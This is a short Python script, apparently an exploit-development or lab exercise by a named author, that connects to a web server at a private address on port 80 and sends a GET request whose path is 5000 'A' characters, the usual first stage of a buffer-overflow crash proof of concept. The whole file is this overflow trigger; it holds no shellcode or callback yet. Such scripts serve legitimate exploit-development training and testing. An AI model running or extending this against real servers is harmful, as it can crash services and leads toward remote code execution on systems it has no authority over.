#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
from struct import pack

buffer = b""
buffer += b"A" * 5000

req = b""
req += b"GET /%s HTTP/1.1\r\n" %buffer
req += b"Host: 192.168.122.49\r\n"
req += b"\r\n"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.122.49",80))
s.send(req)
